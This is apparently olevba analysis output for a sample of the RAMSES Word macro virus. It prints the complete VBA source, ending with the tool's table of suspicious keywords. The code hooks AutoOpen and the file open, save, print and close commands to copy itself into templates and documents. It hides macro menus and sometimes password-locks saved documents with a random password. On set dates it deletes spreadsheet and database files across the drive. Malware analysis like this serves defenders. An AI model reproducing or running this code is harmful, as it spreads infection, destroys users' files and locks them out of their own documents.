olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Ramses-4932b6f5d7711170e5f6e6c2a1c3b1b73d3dcd74
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument 
in file: Virus.MSWord.Ramses-4932b6f5d7711170e5f6e6c2a1c3b1b73d3dcd74 - OLE stream: 'ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO NewMacros 
in file: Virus.MSWord.Ramses-4932b6f5d7711170e5f6e6c2a1c3b1b73d3dcd74 - OLE stream: 'NewMacros'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
(empty macro)
-------------------------------------------------------------------------------
VBA MACRO RAMSES 
in file: Virus.MSWord.Ramses-4932b6f5d7711170e5f6e6c2a1c3b1b73d3dcd74 - OLE stream: 'RAMSES'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "..."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.RAMSES.MAIN"
Dim a
Dim j
Dim i
Dim o
Dim h$
Dim k
Dim y
Dim d1 As Object
Dim w$
'
' RAMSES Virus: il Signore della Vita
' Italy 7/97 version 1.0
'
WordBasic.DisableAutoMacros
On Error Resume Next
ReDim r__$(8)
r__$(1) = "AutoOpen"
r__$(2) = "FileChiudi"
r__$(3) = "FileSalva"
r__$(4) = "FileStampa"
r__$(5) = "FileStampaPredef"
r__$(6) = "FileSalvaConNome"
r__$(7) = "FileApri"
r__$(8) = "RAMSES"
WordBasic.DisableInput 1
WordBasic.ScreenUpdating 0
WordBasic.ToolsOptionsSave GlobalDotPrompt:=0, FastSaves:=0, _
                  AutoSave:=1, SaveInterval:="10"
a = -1
If WordBasic.[MacroFileName$]() = WordBasic.[FileName$]() Then
j = 0
For i = 1 To WordBasic.CountMacros()
If WordBasic.[MacroName$](i, 0) = "RAMSES" Then j = -1
Next
If Not (WordBasic.CountMacros() = 8 And j) Then
For i = WordBasic.CountMacros() To 1 Step -1
WordBasic.ToolsMacro Name:=WordBasic.[MacroName$](i, 0), Show:=1, Delete:=1
Next
For i = 1 To 8
WordBasic.MacroCopy WordBasic.[FileName$]() + ":" + r__$(i), r__$(i), 1
Next
For i = 0 To 1
If i Then o = 1 Else o = 6
For j = 1 To o Step 5
h$ = WordBasic.[MenuText$](i, j)
For k = WordBasic.CountMenuItems(h$, i) To 1 Step -1
If InStr(WordBasic.[MenuItemMacro$](h$, i, k), "Macro") Then
For y = i To 1
WordBasic.ToolsCustomizeMenus MenuType:=i, Position:=k, _
Name:=WordBasic.[MenuItemMacro$](h$, i, k), Menu:=h$, _
Remove:=1, Context:=0
Next
End If
If InStr(WordBasic.[MenuItemMacro$](h$, i, k), "Modelli") Then
WordBasic.ToolsCustomizeMenus MenuType:=i, Position:=k, _
Name:=WordBasic.[MenuItemMacro$](h$, i, k), Menu:=h$, _
Remove:=1, Context:=0
End If
Next
Next
Next
End If
Else
If WordBasic.CountMacros(1) <> 8 Then a = 0
For i = WordBasic.CountMacros(1) To 1 Step -1
If WordBasic.[Right$](WordBasic.[MacroDesc$](WordBasic.[MacroName$](i, 1)), 3) <> "..." Then
WordBasic.ToolsMacro Name:=WordBasic.[MacroName$](i, 1), Show:=3, Delete:=1
a = 0
End If
Next
End If
Dim d As Object: Set d = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs d
If d.Format = 1 Or d.Format = 0 Or d.Format = 6 Then
d.Format = 1
y = 0
Set d1 = WordBasic.DialogRecord.DocumentStatistics(False)
WordBasic.CurValues.DocumentStatistics d1
h$ = d1.FileSize
If (WordBasic.Minute(WordBasic.Now()) Mod 27 = 0) Or _
(WordBasic.Val(WordBasic.[Left$](h$, InStr(h$, " "))) > 46080) Then
w$ = ""
For i = 1 To 15
w$ = w$ + Chr(WordBasic.Int(Rnd() * 90) + 33)
Next
d.Password = w$
y = -1
Else
If Not a Then
For i = 1 To 8
WordBasic.MacroCopy r__$(i), WordBasic.[FileName$]() + ":" + r__$(i), 1
Next
y = -1
End If
End If
If y = -1 Then
WordBasic.FileSaveAs d
End If
End If
If WordBasic.Day(WordBasic.Now()) = 22 And (WordBasic.Month(WordBasic.Now()) Mod 2) = 0 Then
i = WordBasic.Int(Rnd() * 5)
Select Case i
Case 0
h$ = "*.xl*"
Case 1
h$ = "*.dbf"
Case 2
h$ = "*.wk*"
Case 3
h$ = "*.mdb"
Case 4
h$ = "*.ptt"
End Select
w$ = WordBasic.[Left$](WordBasic.[FileName$](), 3)
WordBasic.FileFind SearchPath:=w$, Name:=h$, SubDir:=1
k = WordBasic.CountFoundFiles() - 1
If k >= 0 Then
For y = 0 To k
WordBasic.Kill WordBasic.[FoundFileName$](y + 1)
Next
End If
WordBasic.MsgBox "La maledizione del Faraone ricada su di te !" + Chr(13) + _
Chr(10) + Chr(10) + "              Il Figlio della Luce", _
"RAMSES", 48
End If
WordBasic.DisableInput 0
WordBasic.ScreenUpdating 1
End Sub

-------------------------------------------------------------------------------
VBA MACRO AutoOpen 
in file: Virus.MSWord.Ramses-4932b6f5d7711170e5f6e6c2a1c3b1b73d3dcd74 - OLE stream: 'AutoOpen'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "..."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.AutoOpen.MAIN"
On Error GoTo -1: On Error GoTo e
WordBasic.DisableAutoMacros
WordBasic.Call "RAMSES"
e:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileApri 
in file: Virus.MSWord.Ramses-4932b6f5d7711170e5f6e6c2a1c3b1b73d3dcd74 - OLE stream: 'FileApri'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Apre un documento od un modello esistente...."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.FileApri.MAIN"
On Error GoTo -1: On Error GoTo e
WordBasic.DisableAutoMacros
Dim d As Object: Set d = WordBasic.DialogRecord.FileOpen(False)
WordBasic.CurValues.FileOpen d
WordBasic.Dialog.FileOpen d
WordBasic.FileOpen d
WordBasic.Call "RAMSES"
e:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSalva 
in file: Virus.MSWord.Ramses-4932b6f5d7711170e5f6e6c2a1c3b1b73d3dcd74 - OLE stream: 'FileSalva'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Salva il documento od il modello attivo...."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.FileSalva.MAIN"
On Error GoTo -1: On Error GoTo e:
WordBasic.DisableAutoMacros
WordBasic.FileSave
On Error Resume Next
WordBasic.Call "RAMSES"
e:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileChiudi 
in file: Virus.MSWord.Ramses-4932b6f5d7711170e5f6e6c2a1c3b1b73d3dcd74 - OLE stream: 'FileChiudi'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Chiude tutte le finestre del documento attivo...."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.FileChiudi.MAIN"
On Error Resume Next
WordBasic.DisableAutoMacros
Dim dl As Object: Set dl = WordBasic.DialogRecord.FileSummaryInfo(False)
WordBasic.CurValues.FileSummaryInfo dl
If dl.NumChars <> "0" Then WordBasic.Call "RAMSES"
On Error GoTo -1: On Error GoTo e:
WordBasic.FileClose
e:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileStampa 
in file: Virus.MSWord.Ramses-4932b6f5d7711170e5f6e6c2a1c3b1b73d3dcd74 - OLE stream: 'FileStampa'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Stampa il documento attivo...."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.FileStampa.MAIN"
On Error Resume Next
WordBasic.DisableAutoMacros
WordBasic.Call "RAMSES"
On Error GoTo -1: On Error GoTo e:
Dim b As Object: Set b = WordBasic.DialogRecord.FilePrint(False)
WordBasic.CurValues.FilePrint b
WordBasic.Dialog.FilePrint b
WordBasic.FilePrint b
e:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileSalvaConNome 
in file: Virus.MSWord.Ramses-4932b6f5d7711170e5f6e6c2a1c3b1b73d3dcd74 - OLE stream: 'FileSalvaConNome'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Salva una copia del documento in un file diverso...."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.FileSalvaConNome.MAIN"
Dim t
Dim j$
On Error Resume Next
WordBasic.DisableAutoMacros
WordBasic.Call "RAMSES"
On Error GoTo -1: On Error GoTo e
Dim d As Object: Set d = WordBasic.DialogRecord.FileSaveAs(False)
WordBasic.CurValues.FileSaveAs d
If d.Format <> 1 Then
   WordBasic.Dialog.FileSaveAs d
   WordBasic.FileSaveAs d
   WordBasic.Call "RAMSES"
Else
   t = WordBasic.Window()
   j$ = d.Name
   WordBasic.FileNew Template:=WordBasic.[FileName$]()
   On Error GoTo -1: On Error GoTo h
   WordBasic.CurValues.FileSaveAs d
   d.Name = j$
   WordBasic.Dialog.FileSaveAs d
   d.Format = 1
   WordBasic.FileSaveAs d
   On Error GoTo -1: On Error GoTo e
   WordBasic.Call "RAMSES"
   If t >= WordBasic.Window() Then t = t + 1
   WordBasic.WindowList t
h:
   WordBasic.FileClose 2
End If
e:
End Sub
-------------------------------------------------------------------------------
VBA MACRO FileStampaPredef 
in file: Virus.MSWord.Ramses-4932b6f5d7711170e5f6e6c2a1c3b1b73d3dcd74 - OLE stream: 'FileStampaPredef'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 

Public Sub MAIN()
Attribute MAIN.VB_Description = "Stampa il documento attivo usando le impostazioni correnti...."
Attribute MAIN.VB_ProcData.VB_Invoke_Func = "Normal.FileStampaPredef.MAIN"
On Error Resume Next
WordBasic.DisableAutoMacros
WordBasic.Call "RAMSES"
On Error GoTo -1: On Error GoTo e:
WordBasic.FilePrintDefault
e:
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Call                |May call a DLL using Excel 4 Macros (XLM/XLF)|
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

